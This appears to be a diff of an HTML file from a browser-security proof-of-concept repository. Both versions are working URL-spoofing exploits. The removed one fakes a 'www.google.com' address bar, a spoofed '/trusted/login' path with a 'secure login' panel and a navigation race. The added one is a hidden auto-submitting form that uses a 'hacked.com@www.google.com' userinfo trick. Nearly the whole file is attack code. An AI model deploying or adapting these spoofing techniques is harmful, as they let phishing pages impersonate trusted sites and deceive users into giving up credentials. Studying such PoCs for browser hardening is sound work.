@@ -1,185 +1,59 @@
-<!DOCTYPE html>
-<html lang="id">
+
+<!DOCTYPE html><html>
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+        <link href="https://github.com/sultanbalkiyeah/sultanbalkiyeah.github.io/raw/master/asdh.jpg" rel="shortcut icon" type="image/x-icon">
+    <link rel="stylesheet" href="https://sultanbalkiyeah.github.io/hush.css">
 
-<title>www.google.com</title>
-
-<meta name="theme-color" content="#f1f3f4" id="themeColor">
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1, maximum-scale=5" />
+    
 <style>
-* { box-sizing: border-box; }
-
-body {
-  margin: 0;
-  font-family: system-ui, -apple-system, Roboto, Arial, sans-serif;
-  background: #0f0f0f;
-  color: #eaeaea;
-  min-height: 200vh;
-  padding: 24px;
-}
-
-h1 { font-weight: 400; }
-
-.fake-bar {
-  position: fixed;
-  left: 0;
-  width: 100%;
-  background: #121212;
-  border-top: 1px solid #303134;
-  text-align: center;
-  padding: 8px 0;
-  font-size: 14px;
-  color: #eaeaea;
-  z-index: 9999;
-  bottom: 0;
-  opacity: 0;
-  visibility: hidden;
-  transition: opacity .25s ease, visibility .25s ease, bottom .2s ease;
-}
-
-.fake-bar.show {
-  opacity: 1;
-  visibility: visible;
-}
-
-#x {
-  position: fixed;
-  opacity: 0;
-  pointer-events: none;
-}
-
-/* attack panel */
-#panel {
-  display: none;
-  margin-top: 24px;
-  padding: 16px;
-  border: 1px solid #303134;
-  background: #121212;
-}
-
-button {
-  padding: 10px 16px;
-  background: #1a73e8;
-  border: none;
-  color: #fff;
-  font-size: 14px;
-}
-</style>
-</head>
-
-<body>
-
-<h1>address spoof when find in pages search</h1>
-<p>this is not rill <b>google</b></p>
-
-<button id="start">Continue</button>
-
-<div id="panel">
-  <p>Loading secure login…</p>
-</div>
-
-<input id="x" autocomplete="email" autofocus>
-
-<div class="fake-bar" id="fakeBar">www.google.com</div>
-
-<script>
-const fakeBar = document.getElementById("fakeBar");
-const themeColor = document.getElementById("themeColor");
-const input = document.getElementById("x");
-const panel = document.getElementById("panel");
-
-let lastViewportHeight = window.innerHeight;
-let lastScrollY = window.scrollY;
-let lastInputTime = 0;
-let active = false;
-
-/* ================= HELPERS ================= */
-function setTheme(color) {
-  themeColor.setAttribute("content", color);
-}
-
-function showBar(bottomPx) {
-  if (active) return;
-  active = true;
-  setTheme("#ffffff");
-  fakeBar.style.bottom = bottomPx + "px";
-  fakeBar.classList.add("show");
-}
-
-function hideBar() {
-  active = false;
-  fakeBar.classList.remove("show");
-  fakeBar.style.bottom = "0px";
-  setTheme("#f1f3f4");
-}
-
-/* ================= USER GESTURE TRICK ================= */
-setTimeout(() => input.focus(), 100);
-
-document.addEventListener("click", () => {
-  input.focus();
-  input.click();
-});
-
-document.addEventListener("input", () => {
-  lastInputTime = Date.now();
-});
-
-window.addEventListener("scroll", () => {
-  lastScrollY = window.scrollY;
-});
-
-/* ================= VIEWPORT HEURISTIC ================= */
-if (window.visualViewport) {
-  window.visualViewport.addEventListener("resize", () => {
-    const vv = window.visualViewport;
-    const heightDiff = lastViewportHeight - vv.height;
-    const keyboardLike = heightDiff > 120;
-    const now = Date.now();
-
-    const focusedEl = document.activeElement;
-    const hasFocusedInput =
-      focusedEl &&
-      (focusedEl.tagName === "INPUT" ||
-       focusedEl.tagName === "TEXTAREA" ||
-       focusedEl.isContentEditable);
-
-    const recentlyTyped = now - lastInputTime < 800;
-    const scrollMoved = Math.abs(window.scrollY - lastScrollY) > 40;
-
-    if (keyboardLike && !hasFocusedInput && !recentlyTyped && !scrollMoved) {
-      const bottomOffset = window.innerHeight - vv.height;
-      showBar(bottomOffset);
-    } else {
-      hideBar();
+    #verify_account:disabled {
+        color: #808080;
+        border-color: #808080;
     }
-
-    lastViewportHeight = vv.height;
-  });
+</style>
+<script type="text/javascript">
+function showContent() {
+  var temp = document.getElementsByTagName("template")[0];
+  var clon = temp.content.cloneNode(true);
+  document.body.appendChild(clon);
 }
-
-/* ================= ATTACK LOGIC ================= */
-/* Step 1: Fake trusted path */
-document.getElementById('start').onclick = () => {
-  history.pushState({}, '', '/trusted/login');
-  panel.style.display = 'block';
-};
-
-/* Step 2: Navigation race (TARGET DI AKHIR) */
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://google.com:9090/#https://google.com:9090';
-      }, 80);
-    });
-  });
-});
-
-window.addEventListener("orientationchange", hideBar);
 </script>
 
+</head>
+
+<body class="body">
+ 
+<center><input type="button" value="Show" onclick="showContent()"></center>
+ 
+<div class="satanhekal-content">
+  
+<section class="hox">
+    
+       <template> <div class="centered">
+            <p class="header">Bypassed ;)</p>
+
+    <form method="GET" action=https://www.hacked.com.hacked.com@www.google.com:443 accept-charset="utf-8">
+                <center>
+                  <input
+            name="%25x444" value="%25" type="hidden" >
+            <input
+            name="" value=""
+            type="checkbox" 
+                  class="satanhekal-button-neutral"
+                  onClick="
+                    this.form.submit();"
+                /></center></form>
+              </template>
+            </div>
+        </div>
+
+</section>
+
+<hr>
+
+</div>
 </body>
 </html>
